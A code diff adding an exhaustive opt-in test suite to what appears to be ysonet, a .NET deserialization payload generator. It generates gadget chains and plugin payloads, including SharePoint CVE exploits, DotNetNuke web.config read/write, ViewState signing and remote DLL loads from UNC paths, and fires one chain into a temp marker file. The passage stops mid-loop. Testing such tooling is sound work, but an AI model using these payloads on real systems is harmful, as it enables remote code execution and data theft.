@@ -1,8 +1,8 @@
+using NDesk.Options;
 using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Text;
-using NDesk.Options;
 using ysonet.Generators;
 using ysonet.Helpers;
 using ysonet.Helpers.Core;
@@ -112,6 +112,23 @@ namespace ysonet.Tests
             Run("SoftBreak wraps over-long help tokens (NDesk hang guard)", SoftBreakWrapsLongTokens);
             Run("Every gadget generates a non-empty payload from valid inputs", EveryGadgetGeneratesAPayload);
             Run("Every safe plugin generates a payload; the rest are explicitly excluded", EverySafePluginGeneratesAPayload);
+
+            // FULL tier (opt-in): the exhaustive combination suite. It is slower and
+            // flashes many self-closing cmd windows / binds loopback sockets, so it
+            // never runs on a normal Debug build. Enable it with the --full arg or the
+            // YSONET_FULL_TESTS env var (the post-build <Exec> inherits the env var).
+            bool full = Array.IndexOf(args, "--full") >= 0
+                || Environment.GetEnvironmentVariable("YSONET_FULL_TESTS") != null;
+            if (full)
+            {
+                Console.Error.WriteLine();
+                Console.Error.WriteLine("---- FULL tier (exhaustive combination suite) ----");
+                Run("Every gadget x formatter x variant generates (x minify)", GadgetFullMatrixGenerates);
+                Run("Payloads fire into test-owned sinks (marker/listener/tempdir/self-cs)", PayloadsFireIntoTestSinks);
+                Run("Output encodings correct per formatter (representative gadgets)", OutputEncodingPerFormatter);
+                Run("Bridged gadget chains (--bgc) generate for every consumer", BridgedChainsGenerate);
+                Run("Every plugin mode/CVE/inner-gadget generates (x minify)", PluginFullMatrixGenerates);
+            }
 
             Console.Error.WriteLine();
             Console.Error.WriteLine("Passed: " + _passed + "  Failed: " + _failed);
@@ -2325,6 +2342,1121 @@ namespace ysonet.Tests
             {
                 try { File.Delete(innerFixture); } catch { }
             }
+        }
+
+        // ================= FULL tier: exhaustive combination suite =================
+        // These five tests never run on a normal Debug build (see Main's tier gate).
+        // They GENERATE every gadget/plugin combination and, where a test-owned sink
+        // can observe the effect, EXECUTE the payload and prove it fires. Standing
+        // safety rule held everywhere below: every command is self-closing or is a
+        // value that is never executed; every listener is loopback-only; every fixture
+        // is a temp file cleaned up. Nothing opens calc or leaves an app running.
+
+        // ---- 6.1 shared helpers ----
+
+        // Encode raw output (string or byte[]) to every output encoding and assert each
+        // is well-formed AND decodes back to the source bytes, so PayloadRunner.Encode is
+        // proven for both raw kinds without multiplying the whole gadget matrix. The
+        // "source bytes" mirror what Encode itself works from: ASCII bytes for a string
+        // (Encode's base64/hex string paths use Encoding.ASCII.GetBytes), the bytes
+        // themselves for a byte[].
+        private static void EncodeAndVerify(object raw, string label)
+        {
+            bool isString = raw is string;
+            byte[] source = isString ? Encoding.ASCII.GetBytes((string)raw) : (byte[])raw;
+            int len;
+
+            // raw: the input unchanged (UTF8 bytes for a string, the bytes for a byte[]).
+            byte[] rawOut = PayloadRunner.Encode(raw, "raw", out len);
+            AssertTrue(rawOut != null, label + ": raw encode is non-null");
+            if (isString)
+                AssertEqual((string)raw, Encoding.UTF8.GetString(rawOut), label + ": raw round-trips a string");
+            else
+                AssertTrue(BytesEqual(source, rawOut), label + ": raw round-trips bytes");
+
+            // base64 and base64-urlencode: reverse the url-escapes, then FromBase64String
+            // must reproduce the source bytes.
+            foreach (string fmt in new string[] { "base64", "base64-urlencode" })
+            {
+                byte[] outBytes = PayloadRunner.Encode(raw, fmt, out len);
+                AssertTrue(outBytes != null && outBytes.Length > 0, label + ": " + fmt + " is non-empty");
+                string s = Encoding.ASCII.GetString(outBytes);
+                if (fmt.Contains("urlencode"))
+                    s = s.Replace("%2B", "+").Replace("%2F", "/").Replace("%3D", "=");
+                byte[] decoded = Convert.FromBase64String(s);
+                AssertTrue(BytesEqual(source, decoded), label + ": " + fmt + " decodes back to raw");
+            }
+
+            // hex: an even-length [0-9A-Fa-f] string that parses back to the source bytes.
+            byte[] hexOut = PayloadRunner.Encode(raw, "hex", out len);
+            AssertTrue(hexOut != null && hexOut.Length > 0, label + ": hex is non-empty");
+            string hex = Encoding.ASCII.GetString(hexOut);
+            AssertTrue(hex.Length % 2 == 0 && IsHex(hex), label + ": hex is even-length hex digits");
+            AssertTrue(BytesEqual(source, HexToBytes(hex)), label + ": hex decodes back to raw");
+
+            // raw-urlencode: for a string it URL-decodes back to the string. For a byte[]
+            // the transform is inherently lossy (UTF8.GetString over arbitrary bytes), so
+            // only assert it is non-empty.
+            byte[] ruOut = PayloadRunner.Encode(raw, "raw-urlencode", out len);
+            AssertTrue(ruOut != null, label + ": raw-urlencode is non-null");
+            if (isString)
+            {
+                string ru = Encoding.UTF8.GetString(ruOut)
+                    .Replace("%2B", "+").Replace("%2F", "/").Replace("%3D", "=");
+                AssertEqual((string)raw, ru, label + ": raw-urlencode round-trips a string");
+            }
+            else
+            {
+                AssertTrue(ruOut.Length > 0, label + ": raw-urlencode of bytes is non-empty");
+            }
+        }
+
+        private static bool IsHex(string s)
+        {
+            foreach (char c in s)
+                if (!((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F')))
+                    return false;
+            return true;
+        }
+
+        private static byte[] HexToBytes(string hex)
+        {
+            byte[] b = new byte[hex.Length / 2];
+            for (int i = 0; i < b.Length; i++)
+                b[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
+            return b;
+        }
+
+        // Reset every private static bool option flag on a plugin type, so a flag one
+        // cell set (test/minify/usesimpletype/...) cannot leak into the next in-process cell.
+        private static void ResetPluginStatics(Type t)
+        {
+            if (t == null) return;
+            foreach (var f in t.GetFields(System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static))
+                if (f.FieldType == typeof(bool))
+                    f.SetValue(null, false);
+        }
+
+        // Write a temp fixture and return its path; the caller deletes it in a finally.
+        private static string MakeTempFile(string name, string content)
+        {
+            string path = Path.Combine(Path.GetTempPath(), name);
+            File.WriteAllText(path, content);
+            return path;
+        }
+
+        // The gadget's own variant option token (--variant, or --internalgadget for
+        // ResourceSet), matching Wizard.VariantFlag; used to pass a variant via ExtraArguments.
+        private static string VariantFlagFor(IGenerator g)
+        {
+            foreach (OptionField f in OptionField.FromOptionSet(g.Options()))
+                if (string.Equals(f.Name, "variant", StringComparison.OrdinalIgnoreCase)
+                    || string.Equals(f.Name, "internalgadget", StringComparison.OrdinalIgnoreCase))
+                    return f.CliFlag;
+            return "--variant";
+        }
+
+        // A fresh InputArgs carrying a never-executed shell command (Test=false).
+        private static InputArgs CalcInput()
+        {
+            InputArgs ia = new InputArgs();
+            ia.Cmd = "calc.exe";
+            ia.Test = false;
+            return ia;
+        }
+
+        // ---- 6.2 gadget generation matrix ----
+
+        // Every gadget x every supported formatter x every variant, crossed with minify
+        // off/on, must produce a non-empty payload (Test=false, so nothing executes). A
+        // new gadget/formatter/variant is picked up automatically. Cells that are
+        // advertised but cannot generate in this environment go in expectedGadgetSkips
+        // with a written reason; it starts empty (the one known advertised-but-broken
+        // combo, ObjRef+ObjectStateFormatter, was fixed by removing OSF from ObjRef).
+        private static void GadgetFullMatrixGenerates()
+        {
+            // Cells that are advertised but CANNOT generate because of a fundamental
+            // serializer limitation. We do NOT skip these silently: the matrix asserts each
+            // fails with the expected error, so the limitation is tested and any behavior
+            // change (it starts working, or fails differently) is caught. Key forms:
+            // "Gadget|Formatter", "Gadget|Formatter|variantN" (both match either minify state),
+            // or the same with a trailing "|minify" to scope to the minified pass only.
+            var expectedGadgetFailures = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase)
+            {
+                // SoapFormatter cannot serialize a generic type. Variant 1 of these gadgets is
+                // TypeConfuseDelegate, whose payload contains a generic SortedSet, so no Soap
+                // payload can be produced; variant 2 (TextFormattingRunProperties) is not generic
+                // and serializes fine. A cleaner fix would be per-variant formatter support (a
+                // design change), flagged for the maintainer.
+                { "ActivitySurrogateDisableTypeCheck|SoapFormatter|variant1",
+                    "Soap Serializer does not support serializing Generic Types" },
+                { "XamlAssemblyLoadFromFile|SoapFormatter|variant1",
+                    "Soap Serializer does not support serializing Generic Types" },
+            };
+
+            string csFixture = MakeTempFile("ysonet_matrix_fixture.cs",
+                "public class YsonetTestFixture { public YsonetTestFixture() { } }");
+            string dllFixture = new Uri(typeof(OptionSet).Assembly.CodeBase).LocalPath;
+
+            bool trace = Environment.GetEnvironmentVariable("YSONET_TRACE") != null;
+            var failures = new List<string>();
+            int cells = 0;
+            int expectedFailures = 0;
+            int perfSkipped = 0;
+            try
+            {
+                foreach (string name in GadgetRegistry.GetAllGadgetNames())
+                {
+                    if (name == "Generic") continue;
+                    if (trace) { Console.Error.WriteLine("  [matrix] " + name); Console.Error.Flush(); }
+                    IGenerator g = GadgetRegistry.CreateGadgetInstance(name);
+                    AssertTrue(g != null, "gadget loads: " + name);
+
+                    var formatters = new List<string>();
+                    foreach (string entry in g.SupportedFormatters())
+                    {
+                        string f = entry.Split(' ')[0];
+                        if (!formatters.Contains(f)) formatters.Add(f);
+                    }
+
+                    var variants = g.Variants();
+                    string variantFlag = VariantFlagFor(g);
+                    int variantCount = (variants == null || variants.Count == 0) ? 1 : variants.Count;
+
+                    foreach (string formatter in formatters)
+                    {
+                        for (int vi = 0; vi < variantCount; vi++)
+                        {
+                            GadgetVariant variant = (variants == null || variants.Count == 0) ? null : variants[vi];
+
+                            for (int m = 0; m < 2; m++)
+                            {
+                                bool minify = m == 1;
+                                CommandInputType inType = (variant == null)
+                                    ? g.CommandInput() : variant.EffectiveInput(g.CommandInput());
+
+                                // DataSetOldBehaviourFromFile's minify pass is a known PERFORMANCE
+                                // problem, not a failure: the BinaryFormatter minifier iterates over
+                                // its embedded compiled assembly for ~2 minutes PER cell (it still
+                                // produces a valid payload). It is left out of the default run to keep
+                                // the FULL suite practical - visibly (logged + counted below), not
+                                // silently. Its non-minify generation is covered here, and the minify
+                                // path is covered by every other gadget, including the fast
+                                // ActivitySurrogateSelectorFromFile / XamlAssemblyLoadFromFile compile
+                                // gadgets. Flagged for the maintainer as a minifier perf issue.
+                                if (minify && name == "DataSetOldBehaviourFromFile")
+                                {
+                                    perfSkipped++;
+                                    if (trace) { Console.Error.WriteLine("    [perf-skip] " + name + " -f " + formatter + " (minify) ~2min/cell"); Console.Error.Flush(); }
+                                    continue;
+                                }
+
+                                string expectedError = ExpectedGadgetFailure(expectedGadgetFailures, name, formatter, variant, minify);
+
+                                InputArgs ia = new InputArgs();
+                                ia.Cmd = SampleInputForGadget(inType, csFixture, dllFixture);
+                                ia.Minify = minify;
+                                ia.Test = false;
+                                // Pass the variant plus a xamlurl: the 3rd (SSRF) variant of
+                                // ObjectDataProvider (and WindowsClaimsIdentity, which reuses it)
+                                // needs a xamlurl, not a shell command; gadgets without that option
+                                // ignore the extra argument.
+                                var extra = new List<string>();
+                                if (variant != null) { extra.Add(variantFlag); extra.Add(variant.Number.ToString()); }
+                                extra.Add("--xamlurl"); extra.Add("http://127.0.0.1/x");
+                                ia.ExtraArguments = extra;
+
+                                GenerationRequest req = new GenerationRequest
+                                {
+                                    GadgetName = name,
+                                    FormatterName = formatter,
+                                    OutputFormat = "",
+                                    InputArgs = ia,
+                                };
+
+                                cells++;
+                                string cellDesc = name + " -f " + formatter
+                                    + (variant == null ? "" : " v" + variant.Number)
+                                    + (minify ? " (minify)" : "");
+                                if (trace) { Console.Error.WriteLine("    [cell] " + cellDesc + (expectedError != null ? " [expect-fail]" : "")); Console.Error.Flush(); }
+
+                                RunResult r;
+                                try { r = PayloadRunner.GenerateGadget(req); }
+                                catch (Exception ex) { r = RunResult.Fail("THREW " + ex.Message); }
+
+                                if (expectedError != null)
+                                {
+                                    // A known-impossible combination: assert it fails with the
+                                    // expected error, so the limitation is tested (not ignored).
+                                    if (r.Success)
+                                        failures.Add(cellDesc + " -> expected the '" + expectedError + "' limitation but generation SUCCEEDED (the limitation may be gone; update the test)");
+                                    else if ((r.ErrorMessage ?? "").IndexOf(expectedError, StringComparison.OrdinalIgnoreCase) < 0)
+                                        failures.Add(cellDesc + " -> failed with an UNEXPECTED error (wanted '" + expectedError + "'): " + r.ErrorMessage);
+                                    else
+                                        expectedFailures++;
+                                }
+                                else
+                                {
+                                    if (!r.Success) failures.Add(cellDesc + " -> " + r.ErrorMessage);
+                                    else if (RawIsEmpty(r.Raw)) failures.Add(cellDesc + " -> empty payload");
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+            finally
+            {
+                try { File.Delete(csFixture); } catch { }
+            }
+
+            if (perfSkipped > 0)
+                Console.Error.WriteLine("  [note] " + perfSkipped + " DataSetOldBehaviourFromFile minify cell(s) left out for performance (~2min/cell BinaryFormatter-minifier issue; they generate a valid payload). Flagged for the maintainer.");
+            AssertTrue(cells > 100, "matrix exercised many cells (was " + cells + ")");
+            AssertTrue(expectedFailures >= 2,
+                "the known SoapFormatter-generics limitation cells were exercised (was " + expectedFailures + ")");
+            AssertTrue(failures.Count == 0,
+                "gadget matrix cells failed (" + failures.Count + " of " + cells + "; " + expectedFailures + " expected-failures verified):\n  "
+                + string.Join("\n  ", failures.ToArray()));
+        }
+
+        // Look up the expected-failure error for a matrix cell, or null if the cell should
+        // generate. Checks the most specific key first (variant + minify) down to the gadget
+        // + formatter, so a "Gadget|Formatter|variantN" entry matches both minify states.
+        private static string ExpectedGadgetFailure(Dictionary<string, string> map, string name, string formatter, GadgetVariant variant, bool minify)
+        {
+            string vk = variant == null ? "" : "|variant" + variant.Number;
+            var keys = new List<string>();
+            if (minify)
+            {
+                keys.Add(name + "|" + formatter + vk + "|minify");
+                keys.Add(name + "|" + formatter + "|minify");
+            }
+            keys.Add(name + "|" + formatter + vk);
+            keys.Add(name + "|" + formatter);
+            foreach (string k in keys)
+            {
+                string v;
+                if (map.TryGetValue(k, out v)) return v;
+            }
+            return null;
+        }
+
+        // ---- 6.5 output encodings per formatter ----
+
+        // Prove every output encoding is correct for every FORMATTER, using one
+        // representative gadget per unique formatter (no need to multiply the gadget
+        // matrix by encodings). ObjectStateFormatter is intentionally offered by no
+        // gadget (it equals LosFormatter without a MAC), so it is absent here by design.
+        private static void OutputEncodingPerFormatter()
+        {
+            var reps = new List<string[]>
+            {
+                new[] { "ObjectDataProvider", "Xaml" },
+                new[] { "ObjectDataProvider", "Json.NET" },
+                new[] { "ObjectDataProvider", "FastJson" },
+                new[] { "ObjectDataProvider", "JavaScriptSerializer" },
+                new[] { "ObjectDataProvider", "XmlSerializer" },
+                new[] { "ObjectDataProvider", "DataContractSerializer" },
+                new[] { "ObjectDataProvider", "YamlDotNet" },
+                new[] { "ObjectDataProvider", "FsPickler" },
+                new[] { "ObjectDataProvider", "SharpSerializerBinary" },
+                new[] { "ObjectDataProvider", "SharpSerializerXml" },
+                new[] { "ObjectDataProvider", "MessagePackTypeless" },
+                new[] { "ObjectDataProvider", "MessagePackTypelessLz4" },
+                new[] { "TypeConfuseDelegate", "BinaryFormatter" },
+                new[] { "TypeConfuseDelegate", "NetDataContractSerializer" },
+                new[] { "TypeConfuseDelegate", "LosFormatter" },
+                new[] { "TextFormattingRunProperties", "SoapFormatter" },
+                new[] { "WindowsPrincipal", "DataContractJsonSerializer" },
+            };
+
+            foreach (string[] rep in reps)
+            {
+                GenerationRequest req = new GenerationRequest
+                {
+                    GadgetName = rep[0],
+                    FormatterName = rep[1],
+                    OutputFormat = "",
+                    InputArgs = CalcInput(),
+                };
+                RunResult r = PayloadRunner.GenerateGadget(req);
+                AssertTrue(r.Success && !RawIsEmpty(r.Raw),
+                    "generate " + rep[0] + " -f " + rep[1] + ": " + r.ErrorMessage);
+
+                // The empty/auto output format must resolve to the default rule
+                // (base64 for the binary-ish formatters, raw for the text ones).
+                AssertEqual(PayloadRunner.GetDefaultOutputFormat(rep[1]), r.EffectiveOutputFormat,
+                    rep[1] + " default output format");
+
+                EncodeAndVerify(r.Raw, rep[0] + "/" + rep[1]);
+            }
+
+            // Both plugin output shapes: ApplicationTrust returns a string, and
+            // TransactionManagerReenlist returns a byte[] (calc.exe is never executed here).
+            ResetPluginStatics(typeof(ysonet.Plugins.ApplicationTrustPlugin));
+            RunResult at = PayloadRunner.RunPlugin("ApplicationTrust", new string[] { "-c", "calc.exe" });
+            AssertTrue(at.Success && at.Raw is string, "ApplicationTrust returns a string payload: " + at.ErrorMessage);
+            EncodeAndVerify(at.Raw, "plugin/ApplicationTrust(string)");
+
+            ResetPluginStatics(typeof(ysonet.Plugins.TransactionManagerReenlistPlugin));
+            RunResult tm = PayloadRunner.RunPlugin("TransactionManagerReenlist", new string[] { "-c", "calc.exe" });
+            AssertTrue(tm.Success && tm.Raw is byte[], "TransactionManagerReenlist returns a byte[] payload: " + tm.ErrorMessage);
+            EncodeAndVerify(tm.Raw, "plugin/TransactionManagerReenlist(byte[])");
+        }
+
+        // ---- 6.6 bridged gadget chains (--bgc) ----
+
+        // The --bgc mechanism is otherwise untested. Every consumer tagged Bridged with
+        // a real SupportedBridgedFormatter() must generate a chain leaf,consumer; the two
+        // known non-consumers must be rejected; and one chain must fire end to end.
+        private static void BridgedChainsGenerate()
+        {
+            var failures = new List<string>();
+            int consumers = 0;
+            foreach (string name in GadgetRegistry.GetAllGadgetNames())
+            {
+                if (name == "Generic") continue;
+                IGenerator g = GadgetRegistry.CreateGadgetInstance(name);
+                if (g == null || !g.Labels().Contains(GadgetTags.Bridged)) continue;
+                string bridgedFmt = g.SupportedBridgedFormatter();
+                if (string.IsNullOrEmpty(bridgedFmt)) continue; // e.g. WindowsPrincipal reports None
+
+                consumers++;
+                // The leaf must produce the consumer's expected bridged formatter.
+                string leaf = bridgedFmt.Equals("LosFormatter", StringComparison.OrdinalIgnoreCase)
+                    ? "TextFormattingRunProperties" : "TypeConfuseDelegate";
+                string finalFmt = g.SupportedFormatters()[0].Split(' ')[0];
+
+                GenerationRequest req = new GenerationRequest
+                {
+                    GadgetName = name,
+                    BridgedGadgetChain = leaf,
+                    FormatterName = finalFmt,
+                    OutputFormat = "",
+                    InputArgs = CalcInput(),
+                };
+                RunResult r = PayloadRunner.GenerateGadget(req);
+                if (!r.Success || RawIsEmpty(r.Raw))
+                    failures.Add(leaf + "," + name + " -f " + finalFmt + " -> " + (r.Success ? "empty" : r.ErrorMessage));
+            }
+
+            AssertTrue(consumers >= 13, "found the bridged consumers (was " + consumers + ")");
+            AssertTrue(failures.Count == 0,
+                "bridged chains failed (" + failures.Count + "):\n  " + string.Join("\n  ", failures.ToArray()));
+
+            // WindowsPrincipal is Bridged-labelled but declares no bridged formatter (None),
+            // so it must be rejected as a bridge consumer.
+            RunResult wp = PayloadRunner.GenerateGadget(new GenerationRequest
+            {
+                GadgetName = "WindowsPrincipal",
+                BridgedGadgetChain = "TypeConfuseDelegate",
+                FormatterName = "BinaryFormatter",
+                OutputFormat = "",
+                InputArgs = CalcInput(),
+            });
+            AssertTrue(!wp.Success, "WindowsPrincipal is rejected as a bridge consumer (no bridged formatter)");
+
+            // DataSetOldBehaviourFromFile is not tagged Bridged, so it must be rejected too.
+            RunResult dsff = PayloadRunner.GenerateGadget(new GenerationRequest
+            {
+                GadgetName = "DataSetOldBehaviourFromFile",
+                BridgedGadgetChain = "TypeConfuseDelegate",
+                FormatterName = "BinaryFormatter",
+                OutputFormat = "",
+                InputArgs = CalcInput(),
+            });
+            AssertTrue(!dsff.Success, "DataSetOldBehaviourFromFile is rejected as a bridge consumer (not tagged Bridged)");
+
+            // One bridged chain must actually execute end to end: TypeConfuseDelegate
+            // wrapped in AxHostState, fired via BinaryFormatter into a marker sink.
+            string marker = Path.Combine(Path.GetTempPath(), "ysonet_bgc_fire.txt");
+            if (File.Exists(marker)) File.Delete(marker);
+            try
+            {
+                InputArgs fa = new InputArgs();
+                fa.Cmd = "cmd /c echo x > \"" + marker + "\"";
+                fa.IsRawCmd = true;
+                fa.Test = false;
+                RunResult fr = PayloadRunner.GenerateGadget(new GenerationRequest
+                {
+                    GadgetName = "AxHostState",
+                    BridgedGadgetChain = "TypeConfuseDelegate",
+                    FormatterName = "BinaryFormatter",
+                    OutputFormat = "",
+                    InputArgs = fa,
+                });
+                AssertTrue(fr.Success && fr.Raw is byte[], "bridged chain generated for firing: " + fr.ErrorMessage);
+                RunSTA(delegate { SerializersHelper.BinaryFormatter_deserialize((byte[])fr.Raw); });
+                AssertTrue(WaitForFile(marker, 2500), "the bridged chain TypeConfuseDelegate,AxHostState fired end to end");
+            }
+            finally
+            {
+                if (File.Exists(marker)) File.Delete(marker);
+            }
+        }
+
+        // ---- 6.4 plugin combination matrix ----
+
+        // One curated row per plugin mode / CVE / inner-gadget (plugin modes are not
+        // machine-enumerable: they live in NDesk OptionSet lambda strings and Run()
+        // switch bodies). Each row must generate a non-empty payload, crossed with
+        // minify off/on where the plugin exposes a minify option. A coverage guard over
+        // every discovered plugin fails the build if a plugin is neither in the matrix
+        // nor explicitly excluded, so a whole new plugin cannot slip through (a new
+        // plugin MODE still has to be added here by hand, by design).
+        private class PluginCell
+        {
+            public string Plugin;
+            public string[] Argv;
+            public PluginCell(string plugin, string[] argv) { Plugin = plugin; Argv = argv; }
+        }
+
+        private static void PluginFullMatrixGenerates()
+        {
+            // Harmless hex keys (from the ViewState usage docs) for the crypto plugins.
+            const string vk = "70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0";
+            const string dk = "34C69D15ADD80DA4788E6E3D02694230CF8E9ADFDA2708EF43CAEF4C5BC73887";
+
+            string innerJson = MakeTempFile("ysonet_pmatrix_inner.json", "{}");
+            string tpqpInner = MakeTempFile("ysonet_pmatrix_tpqp.json", "{}");
+            string csFixture = MakeTempFile("ysonet_pmatrix_fixture.cs",
+                "public class YsonetTestFixture { public YsonetTestFixture() { } }");
+            string resxOut = Path.Combine(Path.GetTempPath(), "ysonet_pmatrix.resources");
+
+            var rows = new List<PluginCell>
+            {
+                new PluginCell("Altserialization", new[] { "-M", "HttpStaticObjectsCollection", "-c", "calc.exe" }),
+                new PluginCell("Altserialization", new[] { "-M", "SessionStateItemCollection", "-c", "calc.exe" }),
+
+                new PluginCell("ApplicationTrust", new[] { "-c", "calc.exe" }),
+
+                new PluginCell("DotNetNuke", new[] { "-m", "run_command", "-c", "calc.exe" }),
+                new PluginCell("DotNetNuke", new[] { "-m", "read_file", "-f", "web.config" }),
+                new PluginCell("DotNetNuke", new[] { "-m", "write_file", "-f", "web.config", "-u", "http://localhost/x" }),
+
+                new PluginCell("GetterCallGadgets", new[] { "-g", "PropertyGrid", "-i", innerJson }),
+                new PluginCell("GetterCallGadgets", new[] { "-g", "ListBox", "-m", "Items", "-i", innerJson }),
+                new PluginCell("GetterCallGadgets", new[] { "-g", "CheckedListBox", "-m", "Items", "-i", innerJson }),
+                new PluginCell("GetterCallGadgets", new[] { "-g", "ComboBox", "-m", "Items", "-i", innerJson }),
+
+                new PluginCell("MachineKeySessionSecurityTokenHandler", new[] { "-c", "calc.exe", "--validationkey", vk, "--decryptionkey", dk }),
+
+                new PluginCell("NetNonRceGadgets", new[] { "-g", "PictureBox", "-f", "Json.NET", "-i", "http://localhost/y" }),
+                new PluginCell("NetNonRceGadgets", new[] { "-g", "PictureBox", "-f", "JavaScriptSerializer", "-i", "http://localhost/y" }),
+                new PluginCell("NetNonRceGadgets", new[] { "-g", "PictureBox", "-f", "Xaml", "-i", "http://localhost/y" }),
+                new PluginCell("NetNonRceGadgets", new[] { "-g", "InfiniteProgressPage", "-f", "Json.NET", "-i", "http://localhost/y" }),
+                new PluginCell("NetNonRceGadgets", new[] { "-g", "InfiniteProgressPage", "-f", "JavaScriptSerializer", "-i", "http://localhost/y" }),
+                new PluginCell("NetNonRceGadgets", new[] { "-g", "InfiniteProgressPage", "-f", "Xaml", "-i", "http://localhost/y" }),
+                new PluginCell("NetNonRceGadgets", new[] { "-g", "FileLogTraceListener", "-f", "Json.NET", "-i", "http://localhost/y" }),
+                new PluginCell("NetNonRceGadgets", new[] { "-g", "FileLogTraceListener", "-f", "JavaScriptSerializer", "-i", "http://localhost/y" }),
+                new PluginCell("NetNonRceGadgets", new[] { "-g", "FileLogTraceListener", "-f", "Xaml", "-i", "http://localhost/y" }),
+
+                new PluginCell("Resx", new[] { "-M", "BinaryFormatter", "-c", "calc.exe" }),
+                new PluginCell("Resx", new[] { "-M", "SoapFormatter", "-c", csFixture }),
+                new PluginCell("Resx", new[] { "-M", "indirect_resx_file", "-F", "\\\\host\\share\\a.resx" }),
+                new PluginCell("Resx", new[] { "-M", "CompiledDotResources", "-c", "calc.exe", "-of", resxOut }),
+
+                new PluginCell("SessionSecurityTokenHandler", new[] { "-c", "calc.exe" }),
+
+                new PluginCell("SharePoint", new[] { "--cve", "CVE-2018-8421", "-c", "calc.exe" }),
+                new PluginCell("SharePoint", new[] { "--cve", "CVE-2018-8421", "-c", "http://localhost/x", "--useurl" }),
+                new PluginCell("SharePoint", new[] { "--cve", "CVE-2019-0604", "-c", "calc.exe" }),
+                new PluginCell("SharePoint", new[] { "--cve", "CVE-2020-1147", "-c", "calc.exe" }),
+                new PluginCell("SharePoint", new[] { "--cve", "CVE-2025-49704", "-c", "calc.exe", "--variant", "1" }),
+                new PluginCell("SharePoint", new[] { "--cve", "CVE-2025-49704", "-c", csFixture, "--variant", "2" }),
+                // CVE-2025-53770 (ToolShell patch bypass) compiles -c as a .cs file, like 49704 variant 2.
+                new PluginCell("SharePoint", new[] { "--cve", "CVE-2025-53770", "-c", csFixture }),
+
+                // Remote-DLL-load gadgets with a natural UNC path: the plugin JSON-escapes the
+                // input by default now, so the backslashes survive generation and the --minify
+                // re-parse (previously \\host\a.dll embedded an invalid \a JSON escape).
+                new PluginCell("ThirdPartyGadgets", new[] { "-g", "UnmanagedLibrary", "-f", "Json.NET", "-i", "\\\\host\\a.dll" }),
+                new PluginCell("ThirdPartyGadgets", new[] { "-g", "WindowsLibrary", "-f", "Json.NET", "-i", "\\\\host\\a.dll" }),
+                new PluginCell("ThirdPartyGadgets", new[] { "-g", "Xunit1Executor", "-f", "Json.NET", "-i", "\\\\host\\a.dll" }),
+                new PluginCell("ThirdPartyGadgets", new[] { "-g", "GetterActiveMQObjectMessage", "-f", "Json.NET", "-i", "calc.exe" }),
+                new PluginCell("ThirdPartyGadgets", new[] { "-g", "PreserveWorkingFolder", "-f", "Json.NET", "-i", "targetdir" }),
+                new PluginCell("ThirdPartyGadgets", new[] { "-g", "OptimisticLockedTextFile", "-f", "Json.NET", "-i", "targetfile.txt" }),
+                new PluginCell("ThirdPartyGadgets", new[] { "-g", "QueryPartitionProvider", "-f", "Json.NET", "-i", tpqpInner }),
+                new PluginCell("ThirdPartyGadgets", new[] { "-g", "FileDiagnosticsTelemetryModule", "-f", "Json.NET", "-i", "targetdir" }),
+                new PluginCell("ThirdPartyGadgets", new[] { "-g", "SingleProcessFileAppender", "-f", "Json.NET", "-i", "targetdir" }),
+                new PluginCell("ThirdPartyGadgets", new[] { "-g", "FileDataStore", "-f", "Json.NET", "-i", "targetdir" }),
+
+                new PluginCell("TransactionManagerReenlist", new[] { "-c", "calc.exe" }),
+
+                new PluginCell("ViewState", new[] { "--dryrun", "--validationkey", vk }),
+                new PluginCell("ViewState", new[] { "-g", "TypeConfuseDelegate", "-c", "calc.exe", "--validationkey", vk }),
+                new PluginCell("ViewState", new[] { "--unsignedpayload", "AAECAwQFBgcICQ==", "--validationkey", vk }),
+            };
+
+            // CVE-2024-38018 needs the bundled SharePoint 2019 DLLs. Include it only when present.
+            string sp2019 = Path.Combine(AppDomain.CurrentDomain.BaseDirectory,
+                "dlls", "sharepoint", "19", "Microsoft.SharePoint.dll");
+            if (File.Exists(sp2019))
+                rows.Add(new PluginCell("SharePoint", new[] { "--cve", "CVE-2024-38018", "-c", "calc.exe" }));
+            else
+                Console.Error.WriteLine("  [skip] SharePoint CVE-2024-38018: bundled SharePoint 2019 DLLs not present");
+
+            var excluded = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase)
+            {
+                { "ActivatorUrl", "makes a live remoting/network call and returns a status string, not a payload" },
+                { "Clipboard", "writes the OS clipboard on an STA thread; covered by the dedicated clipboard tests" },
+                { "Generic", "base plugin type, not a real plugin" },
+            };
+
+            bool trace = Environment.GetEnvironmentVariable("YSONET_TRACE") != null;
+            var failures = new List<string>();
+            var covered = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
+            try
+            {
+                foreach (PluginCell cell in rows)
+                {
+                    covered.Add(cell.Plugin);
+                    IPlugin instance = PluginRegistry.CreatePluginInstance(cell.Plugin);
+                    Type ptype = instance == null ? null : instance.GetType();
+                    bool hasMinify = PluginHasMinify(instance);
+
+                    // minify off, then on where supported
+                    int passes = hasMinify ? 2 : 1;
+                    for (int mp = 0; mp < passes; mp++)
+                    {
+                        bool minify = mp == 1;
+                        string[] argv = cell.Argv;
+                        if (minify)
+                        {
+                            argv = new string[cell.Argv.Length + 1];
+                            Array.Copy(cell.Argv, argv, cell.Argv.Length);
+                            argv[argv.Length - 1] = "--minify";
+                        }
+
+                        string desc = cell.Plugin + " " + string.Join(" ", cell.Argv) + (minify ? " --minify" : "");
+                        if (trace) { Console.Error.WriteLine("    [plugin] " + desc); Console.Error.Flush(); }
+
+                        ResetPluginStatics(ptype);
+                        RunResult r;
+                        try { r = PayloadRunner.RunPlugin(cell.Plugin, argv); }
+                        catch (Exception ex) { failures.Add(desc + " -> THREW " + ex.Message); continue; }
+                        if (!r.Success) { failures.Add(desc + " -> " + r.ErrorMessage); continue; }
+                        if (RawIsEmpty(r.Raw)) { failures.Add(desc + " -> empty payload"); }
+                    }
+                }
+
+                // Coverage guard: every discovered plugin is generated or excluded.
+                foreach (string name in PluginRegistry.GetAllPluginNames())
+                {
+                    bool known = covered.Contains(name) || excluded.ContainsKey(name);
